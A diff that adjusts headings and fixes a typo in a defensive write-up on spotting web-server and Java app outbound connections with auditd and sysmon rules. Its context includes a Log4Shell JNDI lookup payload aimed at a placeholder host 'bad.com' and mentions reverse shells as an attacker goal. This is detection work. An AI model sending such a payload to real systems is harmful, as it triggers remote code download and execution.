@@ -532,7 +532,7 @@ Some reasons an attacker might do this are:
 - Establishing a reverse shell
 - Moving laterally by accessing other machines through the web shell
 
-#### 1.6.1 auditd
+##### 1.6.1 auditd
 
 
 Referencing [\[4\]](https://www.linkedin.com/pulse/using-auditd-monitor-network-connections-alex-maestretti/), we can us auditd to look for IP connections created by `www-data` (Replace `euid` for other users).
@@ -552,7 +552,7 @@ PROCTITLE proctitle=6375726C0068747470733A2F2F7777772E676F6F676C652E636F6D
 
 As you can see, the log does not include IP metadata such as destination port and destination IP address. This would make it difficult to exclude some known connections the webserver might make, such as connections to a DB.
 
-#### 1.6.2 sysmon
+##### 1.6.2 sysmon
 
 In sysmon we can use the following rule
 
@@ -608,7 +608,7 @@ ${jndi:ldap://bad.com/exploit}
 
 This causes the application to fetch the remote java object and execute it. This is an example of a case where outbound connections by the java applications might be an indicator of exploitation. We can use `auditd` and `sysmon` to look for network connections initiated by the app running on docker. 
 
-##### 1.6.3.1 auditd
+** 1.6.3.1 auditd ** 
 
 Because of how docker runs, the container and application will run as root. So if we look for new connections made by the app, we will need to look for connections created by `root` 
 
@@ -626,9 +626,9 @@ SYSCALL arch=c000003e syscall=41 success=yes exit=23 a0=2 a1=1 a2=0 a3=0 items=0
 PROCTITLE proctitle=6A617661002D6A6172002F6170702F737072696E672D626F6F742D6170706C69636174696F6E2E6A6172
 ```
 
-Althought this catches the exploit, it also catches other normal network connections root might make. What if we want to filter only for connections created by "java". I don't think you can do this with `auditd`'s filters although I may be wrong.
+Although this catches the exploit, it also catches other normal network connections root might make. What if we want to filter only for connections created by "java". I don't think you can do this with `auditd`'s filters although I may be wrong.
 
-##### 1.6.3.1 sysmon
+** 1.6.3.2 sysmon **
 
 In sysmon, this would be much easier to do
 
